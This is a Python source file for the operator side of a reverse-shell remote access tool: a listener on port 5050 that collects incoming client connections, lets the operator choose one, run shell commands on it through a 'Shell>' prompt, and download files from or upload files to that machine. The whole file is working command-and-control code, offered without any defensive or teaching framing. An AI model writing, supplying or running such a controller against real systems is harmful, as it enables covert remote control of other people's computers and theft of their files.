import socket
import sys
import os
import time

host = "0.0.0.0"  # Listen for all connections
port = 5050  # Enter your port here


# Create a Socket (connect to computers)
def createSocket():
    try:
        global s
        s = socket.socket()  # Creating a Socket
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))


# Binding the Socket and Listening for Connections
def bindSocket():
    try:
        global s
        print("Binding Port: " + str(port))
        s.bind((host, port))  # Tuple in Python
        s.listen(5)  # At most 5 connections
    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying...")
        bindSocket()  # Recursively Calling Again


# Accepting Connection With Client (Sockets Must Be Listening)
def acceptSocket():
    connections = []  # List to store all client connections
    print("Waiting for connections...")

    while True:
        try:
            # Ask the user if they want to wait for new connections
            choice = input("Enter the number of the client to interact with (or 'w' to wait for 6 seconds): ")
            if choice.lower() == 'w':
                print("Waiting for new connections for 6 seconds...")
                s.settimeout(6)  # Set a 6-second timeout for accepting new connections
                try:
                    connection, address = s.accept()
                    print(f"Connection Established With: IP {address[0]}, Port {address[1]}")
                    connections.append((connection, address))  # Add connection to the list
                except socket.timeout:
                    print("No new connections received within 6 seconds.")
                s.settimeout(None)  # Restore blocking mode
            else:
                try:
                    selected_index = int(choice) - 1
                    if 0 <= selected_index < len(connections):
                        selected_connection, selected_address = connections[selected_index]
                        print(f"Selected Client: IP {selected_address[0]}, Port {selected_address[1]}")
                        sendCommand(selected_connection)  # Interact with the selected client
                    else:
                        print("Invalid selection. Please try again.")
                except ValueError:
                    print("Invalid input. Please enter a number or 'w'.")

            # Display the list of connected clients
            print("\nConnected Clients:")
            for idx, (conn, addr) in enumerate(connections):
                print(f"{idx + 1}. IP: {addr[0]}, Port: {addr[1]}")

        except KeyboardInterrupt:
            print("\nServer is shutting down...")
            for conn, addr in connections:
                conn.close()
            s.close()
            sys.exit()


# Send Commands to the Client
def sendCommand(connection):
    while True:
        cmd = input("Shell> ")
        if cmd == "exit":
            connection.close()
            print("Connection closed. Returning to client selection.")
            break

        # Handle file download
        elif cmd.startswith("download"):
            file_name = cmd.split(" ")[1]
            connection.send(str.encode("download"))  # Send command type
            time.sleep(0.1)  # Small delay
            connection.send(str.encode(file_name))  # Send file name

            # Wait for the client's response
            response = connection.recv(1024)
            if response == b"FILE_NOT_FOUND":
                print(f"File '{file_name}' does not exist on the client.")
            else:
                # Proceed with downloading the file
                download_file(connection, file_name)


        # Handle file upload
        elif cmd.startswith("upload"):
            file_path = cmd.split(" ")[1]
            if os.path.exists(file_path):
                connection.send(str.encode("upload"))  # Send command type
                upload_file(connection, file_path)
            else:
                print("File not found.")

        # Handle regular commands
        else:
            connection.send(str.encode("shell"))  # Send command type
            connection.send(str.encode(cmd))  # Send the actual command

            # Receive the length of the output first
            output_length = int(connection.recv(1024).decode("utf-8"))
            connection.send(b"OK")  # Acknowledge

            # Receive the output in chunks
            full_output = b""
            while len(full_output) < output_length:
                chunk = connection.recv(1024)
                if not chunk:
                    break
                full_output += chunk

            print(full_output.decode("utf-8"), end="")


# Download a file from the client
def download_file(connection, file_name):
    try:
        with open(file_name, "wb") as file:
            while True:
                file_data = connection.recv(1024)
                if file_data.endswith(b"<EOF>"):  # End of file marker
                    file.write(file_data[:-5])  # Write data without the marker
                    break
                file.write(file_data)
        print(f"File '{file_name}' downloaded successfully.")
    except Exception as e:
        print(f"Error downloading file: {e}")


# Upload a file to the client
def upload_file(connection, file_path):
    try:
        # Extract the file name from the file path
        file_name = os.path.basename(file_path)

        # Send the file name first
        connection.send(str.encode(file_name))
        time.sleep(0.1)  # Small delay to ensure the client receives the file name first

        # Open the file and send its data
        with open(file_path, "rb") as file:
            file_data = file.read()
            connection.sendall(file_data)  # Send the entire file data
            time.sleep(0.1)  # Small delay to ensure the client receives all data
            connection.send(b"<EOF>")  # Send an end-of-file marker

        print(f"Server: File '{file_name}' uploaded successfully.")
    except Exception as e:
        print(f"Server: Error uploading file: {e}")


def main():
    createSocket()
    bindSocket()
    acceptSocket()

main()